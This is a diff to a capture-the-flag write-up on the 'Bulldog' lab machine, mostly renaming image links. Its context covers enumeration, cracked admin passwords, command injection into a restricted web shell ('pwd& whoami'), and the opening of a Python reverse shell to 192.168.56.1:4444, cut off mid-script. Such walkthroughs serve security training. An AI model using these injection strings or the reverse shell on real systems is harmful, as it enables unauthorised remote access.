@@ -6,7 +6,7 @@
 ### enumeration - external
 Since the machine's ip is already shown at its login page, I decide to check it on my browser to see if there's any useful information in it:
 
-![bulldog 1](./images/bulldog-1.png)
+![bulldog 1](./images/bulldog-1-1.png)
 
 But there isn't relevant info on the page (even after reading the source code) nor in the "Public Notice" link above the bulldog photo (except for text, that is, which could be used in CeWL if it comes to that). Running exiftoon on the photo also doesn't give me anything useful, just the cheeky nod:
 
@@ -92,11 +92,11 @@ Progress: 63900 / 882244 (7.24%)                                                
 ```
 
 The /dev/ directory found by gobuster seems to have interesting information in it. At surface level, this is what it looks like:
-![bulldog 2](./images/bulldog-2.png)
+![bulldog 2](./images/bulldog-1-2.png)
 
 And when trying to go to the "Web-Shell" link, what I get is:
 
-![bulldog 3](./images/bulldog-3.png)
+![bulldog 3](./images/bulldog-1-3.png)
 
 Meaning that I must authenticate (probably happens in the /admin/ directory found by gobuster) in order to access this page.
 
@@ -131,25 +131,25 @@ d8b8dd5e7f000b8dea26ef8428caf38c04466b3e:bulldoglover
 So, cross-referencing the cracked hashes to the comments, I get that username 'sarah' has password 'bulldoglover' and username 'nick' has password 'bulldog'.
 When I go to the '/admin/' directory, it redirects me to '/admin/login/?next=/admin/', and  I'm presented to:
 
-![bulldog 4](./images/bulldog-4.png)
+![bulldog 4](./images/bulldog-1-4.png)
 
 
 ### exploitation - external to internal
 I proceed to log-in with Username 'sarah' and Password 'bulldoglover'. After that I go to '/dev/' again, click on the "Web-Shell" link, and am redirected to:
 
-![bulldog 5](./images/bulldog-5.png)
+![bulldog 5](./images/bulldog-1-5.png)
 
 I seem to be able to run only the commands allowed, when I try to ping back my host machine, what I get is:
 
-![bulldog 6](./images/bulldog-6.png)
+![bulldog 6](./images/bulldog-1-6.png)
 
 But, as it is well known, we can use ';' to run one command and then the next, one, so trying "pwd; whoami":
 
-![bulldog 7](./images/bulldog-7.png)
+![bulldog 7](./images/bulldog-1-7.png)
 
 But there is another way, using an ampersand, so, running "pwd& whoami":
 
-![bulldog 8](./images/bulldog-8.png)
+![bulldog 8](./images/bulldog-1-8.png)
 
 And I get the info that the user serving the page is 'django', and also that the string sent is not clean enough, allowing for the ampersand to pass. So I proceed to plan a reverse shell. I check to see if the machine has php, by running:
 
@@ -165,9 +165,7 @@ pwd& which python
 
 And it returns the path to python, which can be used for a reverse shell. But it shouldn't be a one-line reverse shell because the input doesn't allow it (due to the semicolons), so I must create a 'revshell.py' file on my machine, that reads:
 
-```
-┌──(j㉿kali)-[~/Desktop/TOOLS]
-└─$ cat revshell.py
+```python
 import socket,os,pty
 s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
 s.connect(("192.168.56.1",4444))
